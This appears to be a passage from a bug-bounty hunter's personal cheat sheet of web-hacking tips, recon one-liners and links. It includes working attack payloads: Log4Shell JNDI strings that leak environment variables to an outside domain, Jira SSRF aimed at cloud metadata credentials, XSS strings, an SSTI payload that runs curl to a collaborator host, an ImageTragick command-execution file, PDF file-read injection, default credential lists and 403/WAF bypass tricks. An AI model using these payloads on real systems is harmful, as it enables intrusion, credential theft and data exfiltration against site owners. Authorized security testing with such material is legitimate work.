   Will leak server side env vars!

2. ${jndi:ldap://${env:JAVA\_VERSION}.domain/a}  
   ${jndi:ldap://${sys:java.version}.domain/a}  
   ${jndi:ldap://${hostName}.domain/a}  
   ${jndi:ldap://${sys:java.vendor}.domain/a}

3. https://twitter.com/ITSecurityguard/status/1470187651844161536?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

4. https://twitter.com/11xuxx/status/1470142371312635906?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

5. https://twitter.com/cyb3rops/status/1469405846010572816?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

</dd>
</dl>

</details>

<details>
<summary>Resources</summary>

<dl>
<dd>

1. https://t.co/zzzJfBQYZL

2. https://t.co/bE5yLGF15w

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Impact by extension</summary>

<dl>
<dd>

asp, aspx, php : webshell, rce  
svg: stored xss, ssrf, xxe  
gif: stored xss, ssrf  
csv: csv injection  
xml: xxe  
avi: lfi,ssrf  
html, js: html injection, xss, open redirect  
png: pixel flood attack, dos  
zip: rce via lfi, dos  
pdf: ssrf, blind xxe

</dd>
</dl>

</details>

<details>
<summary>Jira vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>SSRF on Jira endpoint</summary>

<dl>
<dd>

1. /plugins/servlet/oauth/users/icon-uri?consumerUri=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

2. /plugins/servlet/gadgets/makeRequest?url=http://host:port@bing.com

</dd>
</dl>

</details>

<details>
<summary>XSS on Jira endpoint</summary>

<dl>
<dd>

1. /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)

2. secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search

3. pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm

4. http://jira.test.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie

</dd>
</dl>

</details>

<details>
<summary>RCE & Path Traversal</summary>

<dl>
<dd>

POST /rest/tinymce/1/macro/preview HTTP/1.1  
Host: JIRA  
...

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","\_template":"file:///etc/passwd"},"body":""}}

</dd>
</dl>

</details>

<details>
<summary>User info disclosure on Jira endpoint</summary>

<dl>
<dd>

1. /rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

2. /s/thiscanbeanythingyouwant/\_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

3. rest/api/2/user/picker?query=admin

</dd>
</dl>

</details>

<details>
<summary>SSTI</summary>

<dl>
<dd>

/secure/ContactAdministrators!default.jspa  
Try SSTI payload in subject and/or body:  
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14179(Info disclosure):</summary>

<dl>
<dd>

http://<JIRA>/secure/QueryComponent!Default.jspa

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14178(Project Key Enum):</summary>

<dl>
<dd>

http://<JIRA>/browse.<PROJECTKEY>

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14181(User enum):</summary>

<dl>
<dd>

http://<JIRA>/secure/ViewUserHover.jspa?username=Admin

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-36289(Username Enumeration) :</summary>

<dl>
<dd>

https://<JIRA>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

</dd>
</dl>

</details>

<details>
<summary>Jira-unauth-popular-filters:</summary>

<dl>
<dd>

https://<JIRA>/secure/ManageFilters.jspa?filterView=popular

</dd>
</dl>

</details>

<details>
<summary>Jira-unauthenticated-dashboards:</summary>

<dl>
<dd>

https://<JIRA>/rest/api/2/dashboard?maxResults=100

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Atlassian.net targets endpoint to check</summary>

<dl>
<dd>

1. For target.atlassian(.)net, check this endpoints:  
   /servicedesk/customer/user/signup [Able to login? Vuln:)]  
   /jira/projects [Can see projects? Vuln:) Now click on sign in and use OAuth]

</dd>
</dl>

</details>

<details>
<summary>S3 bucket commands to try</summary>

<dl>
<dd>

aws s3api get-bucket-acl --bucket [BucketName]  
aws s3 ls s3://[BucketName]  
aws s3 mv test.txt s3://[BucketName]  
aws s3 cp test.txt s3://[BucketName]  
aws s3 rm s3://[BucketName]

</dd>
</dl>

</details>

<details>
<summary>Find s3 buckets using waybackurls</summary>

<dl>
<dd>

https://web.archive.org/cdx/search/cdx?url=*.target.com.s3.amazonaws.com/*&output=text&fl=original&collapse=urlkey

</dd>
</dl>

</details>

<details>
<summary>Hidden signup endpoints of different services</summary>

<dl>
<dd>

1. laravel : /register

2. drupal: /user/register

3. wordpress: /wp-login.php?action=register

4. ezpublish: /register

</dd>
</dl>

</details>

<details>
<summary>Collection of Tips :</summary>

<dl>
<dd>

https://twitter.com/intigriti/status/1273951215152496642?s=20&t=z6jIGsBhQjafvRUFg5zGzg

</dd>
</dl>

</details>

<details>
<summary>2FA Bypass techniques</summary>

<dl>
<dd>

https://twitter.com/TodayCyberNews/status/1484882978337542145?s=20&t=z6jIGsBhQjafvRUFg5zGzg

</dd>
</dl>

</details>

<details>
<summary>Dealing with 403 codes urls</summary>

<dl>
<dd>

<details>
<summary>One :</summary>

<dl>
<dd>

$waybackurls target.com | while read -r line; do curl -w "%{http\_code}\n" -ks $line -o /dev/null | grep -q "403" && echo -e "$line - 403"; done  
$waybackurls target.com | httpx -silent -mc 403  
$ffuf -w words -u FUZZ -mc 403

</dd>
</dl>

</details>

<details>
<summary>Two</summary>

<dl>
<dd>

https://twitter.com/acharyar00071/status/1551820745181138944?s=20&t=oky5cuE9-2Q2tjsMh0eTcQ

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Reports handling Tip</summary>

<dl>
<dd>

After Triaged as "low" ,request from the Program team if they can send the CVSS , they sent it , and upgrade severity from "low" to "medium" , it's good idea to ask for CVSS if you think your report has more impact ..

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Roadmaps</summary>

<dl>
<dd>

https://github.com/1ndianl33t/Bug-Bounty-Roadmaps

</dd>
</dl>

</details>

<details>
<summary>Hunting on Main Application</summary>

<dl>
<dd>

https://twitter.com/tabaahi_/status/1571386282835873792?s=20&t=PrKzzJkeYEbJcvF_LRjI7w

</dd>
</dl>

</details>

<details>
<summary>Spring boot actuator</summary>

<dl>
<dd>

"application/vnd.spring-boot.actuator.v3+json"  
  
end points :  
actuator/beans  
actuator/info  
actuator/caches  
actuator/env

</dd>
</dl>

</details>

<details>
<summary>Bugs everyone misses</summary>

<dl>
<dd>

https://twitter.com/marcos_iaf/status/1569730143115169793?s=20&t=PrKzzJkeYEbJcvF_LRjI7w

</dd>
</dl>

</details>

<details>
<summary>Top Browser Extension every hunter needs</summary>

<dl>
<dd>

https://twitter.com/MeAsHacker_HNA/status/1569558995530141696?s=20&t=PrKzzJkeYEbJcvF_LRjI7w

1 KNOXSS for XSS  
2 Wappalyzer  
3 Hackbar  
4 DotGit  
5 ModHeader

</dd>
</dl>

</details>

<details>
<summary>ImageTragick payload</summary>

<dl>
<dd>

Have a file upload that only accepts images?

Try this imagetragick payload:

%!PS  
userdict /setpagedevice undef  
save  
legal  
{ null restore } stopped { pop } if  
{ legal } stopped { pop } if  
restore  
mark /OutputFile (%pipe%nslookup YOURCOLLABURL) currentdevice putdeviceprops

</dd>
</dl>

</details>

<details>
<summary>Resolve domains into ip</summary>



</details>

<details>
<summary>PDF injection to local file read</summary>

<dl>
<dd>

Got injection in a PDF, try reading local files with:

```html
<div>
    <object data="c:\inetpub\wwwroot\web.config"></object>
</div>

</dd>
</dl>

</details>

<details>
<summary>ASP.NET server web-apps tip</summary>

<dl>
<dd>

whenever you see : )  
Server: Microsoft-IIS/6.X  
X-Powered-By: ASP.NET

Always try this .....   
  
/admin/help.cgi  
/admin/help.cgi.bak  
/admin/WS\_FTP.LOG  
/adovbs.inc  
/confirm.asp.bak   
/default.asp.bak  
/login.asp.bak

/pindex.asp.bak  
/rootlogin.asp.bak  
/rootlogin.asp.old  
/\_vti\_pvt/service.cnf  
/include/common.inc  
/WS\_FTP.LOG

<details>
<summary>Outcomes</summary>

<dl>
<dd>

1. A serious WS\_FTP vulnerability was identified within your web application. WS\_FTP is a popular FTP client for Windows which is utilized by system administrators and developers to upload and download files from web servers, with each transfer notated in a log file by default.

2. The service.cnf file was found in the \_vti\_pvt directory on a system running Microsoft FrontPage Server Extensions. An attacker could submit a request for the vulnerable file and cause the server to reveal sensitive system information.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Permanenet DOS by account lockout of victim</summary>

<dl>
<dd>

https://twitter.com/AkashHamal0x01/status/1401072585756975105?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Race condition Tip</summary>

<dl>
<dd>

https://twitter.com/imranHudaA/status/1407954842350284805?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Sensitive info disclosure tip</summary>

<dl>
<dd>

https://twitter.com/_justYnot/status/1438355065518002180?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

Information disclosure $$$

1. subfinder -d target. com | httprobe -c 100 > target.txt got around 210 subdomains.

2. cat target.txt | aquatone -out ~aquatone/target

3. Checked every screenshot and found an interesting subdomain.

</dd>
</dl>

</details>

<details>
<summary>Command Injection Tip</summary>

<dl>
<dd>

https://twitter.com/p3n73st3r/status/1556645395928866818?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Api\_keys checker</summary>

<dl>
<dd>

https://github.com/daffainfo/Key-Checker

</dd>
</dl>

</details>

<details>
<summary>Hackerone Public Programs statistics checker</summary>

<dl>
<dd>

https://www.bugbountyhunter.com/publicprograms

</dd>
</dl>

</details>

<details>
<summary>Favicon finder</summary>

<dl>
<dd>

1. curl -s -L -k https://d3e54v103j8qbb.cloudfront.net/static/designer_favicon.5ea478d03e.png | python3 -c 'import mmh3,sys,codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'

2. http://faviconhasher.herokuapp.com/

</dd>
</dl>

</details>

<details>
<summary>IDOR UUID Tip</summary>

<dl>
<dd>

IDOR Trick:

If you're dealing with a UUID-based IDOR, try this:

00000000-0000-0000-0000-000000000000

This might expose default objects or unintended access.

</dd>
</dl>

</details>

<details>
<summary>Grep IP from file</summary>

<dl>
<dd>

grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

</dd>
</dl>

</details>

<details>
<summary>Get subs from iP’s</summary>

<dl>
<dd>

python3 hosthunter.py HOSTS.txt > OUT.txt

</dd>
</dl>

</details>

<details>
<summary>Google spreadsheet tip</summary>

<dl>
<dd>

Often when you gather URLs of a target you find some google spreadsheet links that return 404, just copy the file KEY and change the link:  
spreadsheets.*google.*com/feeds/list/KEY -> 404  
docs.*google.*com/spreadsheets/u/0/d/KEY/pub -> 200

</dd>
</dl>

</details>

<details>
<summary>Wildcard Params</summary>

<dl>
<dd>

Wildcard parameer in web API Pentesting  
Try to use the following symbols as wildcards: *, %, \_, .  
~ /api/users/*  
~ /api/users/%  
~ /api/users/\_  
~ /api/users/.

</dd>
</dl>

</details>

<details>
<summary>Learning about APIs services</summary>

<dl>
<dd>

https://docs-smp.leanix.net/docs

</dd>
</dl>

</details>

<details>
<summary>Duckduck go tracker-radar</summary>

<dl>
<dd>

If you want to find domains associated to an organization, you can explore DuckDuckGo's tracker-radar.   
It's a publicly accesible dataset that stores web tracking information, including domains operated by an organization.

https://github.com/duckduckgo/tracker-radar/blob/feffe1d908e57c077991826745aff18b01b7f525/entities/PayPal%2C%20Inc..json#L44

</dd>
</dl>

</details>

<details>
<summary>Free-courses source</summary>

<dl>
<dd>

https://freecourses.github.io/

</dd>
</dl>

</details>

<details>
<summary>Grep domains level from domains.txt</summary>

<dl>
<dd>

1. E.g, `cat subdomains.txt | grep -P '^(?:[a-z0-9]+\.){MIN,MAX}[^.]*$'`

grep -P '^(?:[a-z0-9]+\.){1}[^.]*$' 2nd level domains only  
grep -P '^(?:[a-z0-9]+\.){2}[^.]*$' 3rd level domains only  
grep -P '^(?:[a-z0-9]+\.){2,}[^.]*$' 3rd level domains or higher  
grep -P '^(?:[a-z0-9]+\.){2,3}[^.]*$' 3rd to 4th level domains only  
grep -P '^(?:[a-z0-9]+\.){3,}[^.]\*$' 4th level domains or higher

</dd>
</dl>

</details>

<details>
<summary>Password Reset:</summary>

<dl>
<dd>

Reset userpassword:

user@email.com.burpcolaborator.com

</dd>
</dl>

</details>

<details>
<summary>Must try this trick in every redirect\_uri</summary>

<dl>
<dd>

https://hackerone.com/reports/861940

</dd>
</dl>

</details>

<details>
<summary>Finding @copyright domains of related company</summary>

<dl>
<dd>

https://twitter.com/Jhaddix/status/1521699404486303745?s=20&t=DTRsTBz4tWFuwxorT_khoQ

</dd>
</dl>

</details>

<details>
<summary>Admin panel default credentials</summary>

<dl>
<dd>

https://twitter.com/_bughunter/status/1521374403761745920?s=20&t=DTRsTBz4tWFuwxorT_khoQ

https://twitter.com/kassem_S94/status/1569622430401847296?s=20&t=PrKzzJkeYEbJcvF_LRjI7w

<details>
<summary>Resources</summary>

<dl>
<dd>

1. https://twitter.com/h4x0r\_dz/status/1569420312407572480?s=20&t=PrKzzJkeYEbJcvF\_LRjI7w

2. Default credentials https://github.com/NafisiAslH/KnowledgeSharing/blob/main/CyberSecurity/Web/WordLists/VendorsDefaultCredentials/credentials.csv

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Authorization bugs</summary>

<dl>
<dd>

Sometimes it's worth to check if Authorization Bearer are properly validated with different HTTP verbs.

1. Completely Remove Authorization bearer from request with different verbs like : DELETE, PUT, GET and more.

<details>
<summary>Tip 2https://twitter.com/harshad_hacker/status/1557230593053986816?s=20&t=aVdmeG-2AI_vi_Gow2DP4w</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Go path setup</summary>

<dl>
<dd>

1. `rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.3.linux-amd64.tar.gz` (get tar file from https://go.dev/doc/install)

2. Add this to .profile file : `export PATH=$PATH:/usr/local/go/bin`

3. Add this to .bashrc file :

`export GOROOT=/usr/local/go  
 export GOPATH=$HOME/go  
 export PATH=$GOPATH/bin:$GOROOT/bin:$PATH`

4. source .bashrc

5. source .profile

6. Done

</dd>
</dl>

</details>

<details>
<summary>Extaract all urls from website by pasting below code in chrome dev-console (`Best for checking Broken Link hijacking` & second order subdomain Takeovers)</summary>

<dl>
<dd>

<details>
<summary>script</summary>

<dl>
<dd>

urls = []  
$$('\*').forEach(element => {  
urls.push(element.src)  
urls.push(element.href)  
urls.push(element.url)  
}); console.log(...new Set(urls))

</dd>
</dl>

</details>

<details>
<summary>Next step</summary>

<dl>
<dd>

Get all the urls and beautify them for neat output , then run urls through httpx or aquatone :-)

</dd>
</dl>

</details>

<details>
<summary>tip</summary>

<dl>
<dd>

Always consider covering second order takeovers, because in most cases they are evaluated as critical, like a blind XSS, which is remotely controllable and even application-wide.

Tip : Care checking DOM elements, for down CDN servers.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Blacklist unwanted proxied hosts `e.g,` `google.com` `,` `gstatic.com``...`</summary>

<dl>
<dd>

While you are testing with Burp Suite, you may want to add these patterns into the Burp Suite > Proxy > Options > TLS Pass Through settings:

Burp Suite TLS Pass Through bug bounty tip  
.*\.google\.com  
.*\.gstatic\.com  
.*\.googleapis\.com  
.*\.pki\.goog  
.*\.mozilla\..*

~ Now all underlying connections to these hosts will go to them directly, without passing through the proxy. No more noise in our proxy logs!

TIP: Then save the configuration and load it on burp start-up!

</dd>
</dl>

</details>

<details>
<summary>New added subdomains finding tip :</summary>

<dl>
<dd>

`“Watch a company closely and as soon as they put new assets/contents, we go after them.  
Find way to identify new added contents in recon files as you do after time to time.”`

<details>
<summary>https://github.com/yassineaboukir/sublert</summary>

<dl>
<dd>

Can be used for this purpose, require slack webhook + VPS.

</dd>
</dl>

</details>

<details>
<summary>Using Amass</summary>

<dl>
<dd>

```
Run scans regularly:

amass enum -d domain.com -nf domains.txt
```

Then, you can track new findings each day via:

```
amass track -d domain.com | grep "Found"
```

![](https://www.infosecmatter.com/wp-content/uploads/2020/09/track-new-assets-with-amass.jpg)

You could also setup a webhook to get notified via Slack and get things automated.

</dd>
</dl>

</details>

<details>
<summary>Another method</summary>

<dl>
<dd>

An easy way to monitor new domains  
1) subfinder -silent -dL domains.txt -all | anew subs.txt  
2) while true; do subfinder -dL domain.txt -all | anew subs.txt | httpx | tee

$RANDOM

.new; sleep 3600; done

</dd>
</dl>

</details>

<details>
<summary>Another method</summary>

<dl>
<dd>

1. Let's say you have scope,text

2. You run your tools to find domains and save them to subs,text

3. Everyday when you go to sleep run

cat scope.txt | domain tools | anew subs.txt | tee -a newly-appear-doman.txt

4. So when you wake up you have new domains. Remember some domains only go live for a few hours.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Directory Bruteforce with `Host: localhost`</summary>

<dl>
<dd>

set the ‘Host’ header to ‘localhost’ in your next directory bruteforce, the results might be surprising! You might gain access to:

- Special features

- Internal endpoints

- Config files, SSL keys

- Directory listing, …

We can even take this a step further and try to identify all sites that are hosted on the target web server by performing virtual host enumeration. How to enumerate virtual hosts? We could use tools such as these:

- https://github.com/ffuf/ffuf

- https://nmap.org/nsedoc/scripts/http-vhosts.html

- https://github.com/jobertabma/virtual-host-discovery

Note that we could also use curl or wget:

```
curl -v -H "Host: localhost" https://target/
wget -d --header="Host: localhost" https://target/
```

</dd>
</dl>

</details>

<details>
<summary>Recon Tip</summary>

<dl>
<dd>

1-Choose a wildscope and enumerate subs using subfinder +amass+ assetfinder + knockpy  
2- Now run httpx and pic intresting subdomains only  
3- Specially php aspx html asp and old looking websites  
4- Now fuzz interesting subs with ffuf

5- Sometimes you will find hidden register endpoint after fuzzing and sensitive info disclosures too  
6- Put more focus on subdomains where you can create account and hunt for manual bugs like Htmli , xss , csrf , idor and check all bugcrowd vrt bugs

7- On login / php website try sqli payloads   
8 - Run some automation scripts too like   
Nuclei on private programs scope and

9 - Use shodan for IP based login panels - try sqli

</dd>
</dl>

</details>

<details>
<summary>Good Resource</summary>

<dl>
<dd>

1. https://www.darksideops.com/public-info-gathering/

2. https://twitter.com/Dheerajmadhukar/status/1453221573238919170?s=20&t=34qtRbX86WQlf643pzPCLA

</dd>
</dl>

</details>

<details>
<summary>Top G one-liner</summary>

<dl>
<dd>

A quick one-liner that will gather + crawl all subdomains, then convert to a custom wordlist unique to that organization based on discovered URLs

subfinder -d bugcrowd.com -silent | httpx -silent | hakrawler -plain | tr ""[:punct:]"" ""\n"" | sort -u

</dd>
</dl>

</details>

<details>
<summary>Quick Bug bounty</summary>

<dl>
<dd>

How I found p2 in 5 minutes using command line chaining and recon:

1. Assetfinder | waybackurls | httprobe | qsreplace '=' | anew > file.txt

2. Cat file.txt | grep 'url =' | grep -v (usless domain captured by assetfinder) > file2.txt  
   Found ssrf, xss and few open redirection

</dd>
</dl>

</details>

<details>
<summary>shodan for cert and subs enumeration</summary>

<dl>
<dd>

I like to use these API Endpoints from Shodan for subdomain && cert enum.

http://ctl.shodan.io/api/v1/domain/{domain}

http://ctl.shodan.io/api/v1/domain/{domain}/hostnames

http://ctl.shodan.io/api/v1/cert/{sha256}

</dd>
</dl>

</details>

<details>
<summary>sub enum tip</summary>

<dl>
<dd>

https://ipv4.bgp.he.net/certs#_SearchTab?q=workleap.com&subdomains=1

</dd>
</dl>

</details>

<details>
<summary>Sub Enum tools</summary>

<dl>
<dd>

https://x.com/zonduu1/status/2031472179808759972?a=TF7xLOR5ZISUMZhNnbE&s=20

https://www.argosdns.io/

https://x.com/IntCyberDigest/status/2090763321032982592/photo/1

https://submap.net/

https://x.com/3nc0d3dGuY/status/2108843784847138956

</dd>
</dl>

</details>

<details>
<summary>Chrome heap snapshots to find hidden API Endpoints</summary>

<dl>
<dd>

- Browse the webapp

- Open chrome dev kit and go to Memory tab

- Click Record Button

- Save/Export the snapshot file to filesystem

- Now you can grep stuff from the saved file

Example : cat Heap-xx.heatsnapshot | grep '/api'

</dd>
</dl>

</details>

<details>
<summary>Goldmine Tip of testing web-app</summary>

<dl>
<dd>

**Q : You’re filling out a form on a web app you’re hacking and you have to enter bogus data into a text field, what’s your go-to?**

Ans : I usually enter the name of the field and the page address. That way if I'm putting in payloads later or scraping data I can pretty easily identify where that given form field is located and what it's vulnerable to.

</dd>
</dl>

</details>

<details>
<summary>To read paid version blogs of medium</summary>

<dl>
<dd>

use freedium  
https://freedium-mirror.cfdhttps://freedium-mirror.cfd/https://medium.com/up-to-spec/the-biggest-problem-in-self-published-fantasy-isnt-bad-prose-6e9f066fa735

</dd>
</dl>

</details>

<details>
<summary>Hacking schedule</summary>

<dl>
<dd>

Like 4-5 hours of recon, then 5-6 hours of exploitation, I had to read a lot of documentation in order to exploit

</dd>
</dl>

</details>

<details>
<summary>Wordlists tip</summary>

<dl>
<dd>

I also found that separating my wordlists by technology works like a charm (php, nginx, aws, swagger, etc.)

</dd>
</dl>

</details>

<details>
<summary>Avoid Burnout</summary>

<dl>
<dd>

https://twitter.com/tabaahi_/status/1569232080210653184?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

</dd>
</dl>

</details>

<details>
<summary>Literal Goldmine of advices by tabaahi</summary>

<dl>
<dd>

https://twitter.com/tabaahi_/status/1568568298710892546?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

https://twitter.com/tabaahi_/status/1564929371084705792?s=20

</dd>
</dl>

</details>

<details>
<summary>Story time of bug</summary>

<dl>
<dd>

https://twitter.com/3nc0d3dGuY/status/1567620852870692864?s=20&t=WgwzZjVAY7IkkAxRYAOAEA

</dd>
</dl>

</details>

<details>
<summary>Authentication bypass weird bug</summary>

<dl>
<dd>

For a ; in an URL such as:

https://api.redacted.com/api/;/admin

Always try 403 bypasses when you go a redirect to an login page.

</dd>
</dl>

</details>

<details>
<summary>Hacking tip 101</summary>

<dl>
<dd>

Always imagine you are the first to hit the app.

This means I usually spend at least one whole day using the app as a regular user while just doing recon. This usually results in enough endpoint/functionality leads that keep me busy for the following days

</dd>
</dl>

</details>

<details>
<summary>Learn CVSS calculation</summary>

<dl>
<dd>

https://twitter.com/mamunwhh/status/1561748638074044417?s=20&t=_831qCX4RPyKiAIP8NhfMQ

</dd>
</dl>

</details>

<details>
<summary>Video to watch about recon</summary>

<dl>
<dd>

https://twitter.com/MeAsHacker_HNA/status/1528680753449603075?s=20&t=_831qCX4RPyKiAIP8NhfMQ

</dd>
</dl>

</details>

<details>
<summary>https://github.com/laramies/theHarvester</summary>

<dl>
<dd>

<details>
<summary>install</summary>

<dl>
<dd>

git clone https://github.com/laramies/theHarvester.git

pip3 install -r requirements.txt

#setup api\_keys for it

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Extaract all urls from website by pasting below code in chrome dev-console (`Best for checking Broken Link hijacking` & second order subdomain Takeovers)</summary>

<dl>
<dd>

<details>
<summary>script</summary>

<dl>
<dd>

urls = []  
$$('\*').forEach(element => {  
urls.push(element.src)  
urls.push(element.href)  
urls.push(element.url)  
}); console.log(...new Set(urls))

</dd>
</dl>

</details>

<details>
<summary>Next step</summary>

<dl>
<dd>

Get all the urls and beautify them for neat output , then run urls through httpx or aquatone :-)

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Blacklist unwanted proxied hosts `e.g,` `google.com` `,` `gstatic.com``...`</summary>

<dl>
<dd>

While you are testing with Burp Suite, you may want to add these patterns into the Burp Suite > Proxy > Options > TLS Pass Through settings:

Burp Suite TLS Pass Through bug bounty tip  
.*\.google\.com  
.*\.gstatic\.com  
.*\.googleapis\.com  
.*\.pki\.goog  
.*\.mozilla\..*

~ Now all underlying connections to these hosts will go to them directly, without passing through the proxy. No more noise in our proxy logs!

TIP: Then save the configuration and load it on burp start-up!

</dd>
</dl>

</details>

<details>
<summary>Bing dorking is different in result than google</summary>



</details>

<details>
<summary>Using http://dnshistory.org you can find hosts that have a specific CNAME</summary>



</details>

<details>
<summary>Learning at pro level</summary>

<dl>
<dd>

if you want to be good at hacking, read all great bug hunters tweet like this. Here I search "ssrf @nnwakelam" so that I can read everything @nnwakelam

post about SSRF. It will help you to be great hacker. Don't ask about tips. Use your brain

</dd>
</dl>

</details>

<details>
<summary>Broken Link checker</summary>

<dl>
<dd>

Some websites to check broken links to find broken link hijacking vulnerabilities  
  
1- https://ahrefs.com/broken-link-checker…

2- https://deadlinkchecker.com

3- https://brokenlinkcheck.com

</dd>
</dl>

</details>

<details>
<summary>Default credentials</summary>

<dl>
<dd>

Found Admin panel? go for Default Creds  
admin:admin  
admin:a  
admin:12346578  
test:test  
guest:guest  
anonymous:anonymous  
admin:password  
admin:  
root:toor  
root:passw0rd  
root:root  
guest:test  
$sub\_name:password  
ADMIN:ADMIN  
Admin:Admin  
:  
a:a

</dd>
</dl>

</details>

<details>
<summary>Learn XSS</summary>

<dl>
<dd>

To find XSS, Really need to know how to build web apps with HTML CSS JS.

OR Learn basics of JS only is enough  
Basics Like - Variables, Data types, Operators, Functions, Objects, Statements And DOM

</dd>
</dl>

</details>

<details>
<summary>Api-keys pro tip</summary>

<dl>
<dd>

find leaked keys in shodan and use it , e.g, securitytrails key

</dd>
</dl>

</details>

<details>
<summary>Google dorking</summary>

<dl>
<dd>

1. Files Containing Juicy Info inurl:"/.vscode/sftp.json”

2. open redirect

site:\*.target.com inurl:%2f

%2f Is the URL encoding for /

</dd>
</dl>

</details>

<details>
<summary>Investigating Zip files contents (`geniously)`</summary>

<dl>
<dd>

(Did you find a very big zip file accessible on a remote web server and want to inspect its contents, but you don’t want to wait for downloading it? No problem..)

~ pip install remotezip

<details>
<summary>list contents of a remote zip file</summary>

<dl>
<dd>

remotezip -l "http://site/bigfile.zip"

</dd>
</dl>

</details>

<details>
<summary>extract file.txt from a remote zip file</summary>

<dl>
<dd>

remotezip "http://site/bigfile.zip" "file.txt"

</dd>
</dl>

</details>

---

</dd>
</dl>

</details>

<details>
<summary>Tips on bypassing 403 & 401 errors</summary>

<dl>
<dd>

Here's a list of tips on how to bypass 403 Forbidden and 401 Unauthorized errors:

1. **By adding headers**: X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For etc. Sometimes companies whitelist the IP for those who can access sensitive data. These headers take IP address as a value and let you access the resource if the supplied IP matches with their whitelisted ones.

2. **With unicode chars**: Try inserting unicode characters to bypass the defenses. Try e.g. ℀ = ca, ℁ = sa and many other (check here or here). So if /cadmin is blocked, try accessing ℀dmin. Check this short youtube video on unicode hacking tricks for more details.

3. **By overriding, overwriting URL with headers**: If `GET /admin` gives you `403 Forbidden`, try to `GET /accessible` (any accessible endpoint) and add any of these HTTP headers:

- `X-Original-URL: /admin`

- `X-Override-URL: /admin`

- `X-Rewrite-URL: /admin`

4. **Try different payloads**: If `GET /admin` gives you `403 Forbidden`, try accessing:

- `/accessible/..;/admin`

- `/.;/admin`

- `/admin;/`

- `/admin/~`

- `/./admin/./`

- `/admin?param`

- `/%2e/admin`

- `/admin#`

5. **Method switching**: Change the method from GET to POST, and see if you get something..

6. **Via IP, Vhost**: Access the site via its IP or Vhost to get the forbidden content.

7. **Fuzzing**: By bruteforcing (fuzzing) files or directories further..

8. **Traversing deeper** :

If accessing “/.git” directory returns 403 Forbidden, try accessing a common subdirectory like “/.git/config”. Chances are that it will be accessible.

This is because a forbidden directory doesn’t necessarily mean that access to all subdirectories and files in the directory is forbidden as well! Keep this in mind while bug hunting.

</dd>
</dl>

</details>

<details>
<summary>Tips on WAF bypass</summary>

<dl>
<dd>

<details>
<summary>Changing the device type in chrome Dev Tools</summary>

<dl>
<dd>

I triggered the xss by bypassing WAF. How?  
I changed the device type to mobile in Dev Tools.

</dd>
</dl>

</details>

<details>
<summary>Changing the http method</summary>

<dl>
<dd>

```jsx
http://web.com/?XSSendpoint ===> no WAF
https://web.com/?XSSendpoint ===> WAF implemented
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>One-liner that will clone all repositories of a GitHub user or organization to the current directory.</summary>

<dl>
<dd>

curl https://api.github[.]com/users/$user/repos?per\_page=1000 | jq .[].html\_url | sed "s/\"//g" | parallel -j 20 "git clone "

</dd>
</dl>

</details>

<details>
<summary>Become Master in automation</summary>

<dl>
<dd>

1. https://sn0xsharma.medium.com/introduction-to-bug-bounty-with-automation-8924400e510b

2. https://labs.detectify.com/2021/11/30/hakluke-creating-the-perfect-bug-bounty-automation/

3. https://infosecwriteups.com/create-your-ultimate-bug-bounty-automation-without-nerdy-bash-skills-part-1-a78c2b109731

4. https://infosecwriteups.com/create-your-ultimate-bug-bounty-automation-without-nerdy-bash-skills-part-2-c8cd72018922

5. https://tomnomnom.com/talks/bash-bug-bounty.pdf

6. https://www.cobalt.io/blog/bug-bounties-on-bash-on-ubuntu-on-windows

</dd>
</dl>

</details>

<details>
